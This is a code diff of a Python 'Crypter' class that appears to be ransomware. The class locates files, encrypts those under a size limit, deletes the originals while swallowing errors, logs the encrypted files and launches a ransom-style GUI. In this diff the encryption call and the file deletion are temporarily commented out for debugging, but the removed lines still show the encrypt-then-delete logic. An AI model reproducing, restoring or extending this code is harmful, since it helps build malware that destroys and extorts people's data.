@@ -45,7 +45,6 @@ class Crypter(Base.Base):
       self.Crypt.init_keys()
       file_list = self.find_files()
       # Start encryption
-      # TODO Restore this
       self.encrypt_files(file_list)
       # Present GUI
       self.start_gui()
@@ -107,18 +106,17 @@ class Crypter(Base.Base):
     start_time = self.get_start_time()
     
     app = wx.App()
-    #sys._MEIPASS = "..\\build\\images"
+    sys._MEIPASS = "..\\build\\images"
     crypter_gui = Gui.Gui(
         image_path=sys._MEIPASS, 
         start_time=start_time,
-        encrypted_file_list=self.encrypted_file_list,
         decrypter=self)
                                
     crypter_gui.Show()
     app.MainLoop()
     
 
-  def get_encrypted_file_list(self):
+  def get_encrypted_files_list(self):
     '''
     @summary: Returns a list of the files encrypted by crypter
     @return: Encrypted file list
@@ -130,6 +128,7 @@ class Crypter(Base.Base):
         file_list = fh.readlines()
       fh.close()
     except IOError:
+      # Don't error, just return message
       raise Exception("A list of encrypted files was not found at: %s" % self.encrypted_file_list)
   
     return file_list
@@ -172,18 +171,22 @@ class Crypter(Base.Base):
 
       # Encrypt file if less than specified file size
       if int(os.path.getsize(file)) < self.MAX_FILE_SIZE_BYTES:
-        is_encrypted = self.Crypt.encrypt_file(file)
+        #is_encrypted = self.Crypt.encrypt_file(file)
+        # TODO feature/decryption_threading
+        is_encrypted = True
       else:
         is_encrypted = False
 
       # IF encrypted, try to delete the file and add to the list
-      if is_encrypted:
-        try:
-          os.remove(file)
-        # Ignore any exception, such as access denied, and continue
-        except:
-          continue
-        encrypted_files.append(file)
+      # TODO feature/decryption_threading
+      #if is_encrypted:
+      #  try:
+      #    os.remove(file)
+      #  # Ignore any exception, such as access denied, and continue
+      #  except:
+      #    continue
+      #  encrypted_files.append(file)
+      encrypted_files.append(file)
 
     # Write out list of encrypted files
     if encrypted_files:
